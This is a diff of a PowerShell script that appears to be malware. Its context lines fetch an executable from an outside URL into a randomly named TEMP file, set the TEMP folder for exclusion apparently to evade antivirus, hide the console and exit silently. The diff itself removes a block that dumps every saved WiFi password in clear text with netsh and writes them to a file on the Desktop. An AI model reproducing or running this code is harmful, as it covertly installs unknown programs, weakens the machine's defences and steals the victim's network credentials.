@@ -10,7 +10,6 @@ $url = "https://dkm.s.gy/file"
 # Generate a random 8-character filename
 $randomName = -join ((65..90) + (97..122) | Get-Random -Count 8 | ForEach-Object {[char]$_})
 $out = "$env:TEMP\$randomName.exe"
-$wifiLog = "$env:USERPROFILE\Desktop\WiFi_Passwords.txt"
 $excludePath = "$env:TEMP"
 
 # --- Hide Window Immediately ---
@@ -41,22 +40,6 @@ try {
         Remove-Item $out -Force -ErrorAction SilentlyContinue
     }
 } catch { }
-
-# --- Priority 3: WiFi Password Extraction ---
-$profiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { $_.ToString().Split(":")[1].Trim() }
-$results = @()
-
-foreach ($profile in $profiles) {
-    try {
-        $details = netsh wlan show profile name="$profile" key=clear
-        $key = ($details | Select-String "Key Content").ToString().Split(":")[1].Trim()
-        $results += "SSID: $profile | Password: $key"
-    } catch {
-        $results += "SSID: $profile | Password: [Hidden/Empty]"
-    }
-}
-
-$results | Out-File -FilePath $wifiLog -Encoding utf8
 
 # --- Exit the terminal silently ---
 exit
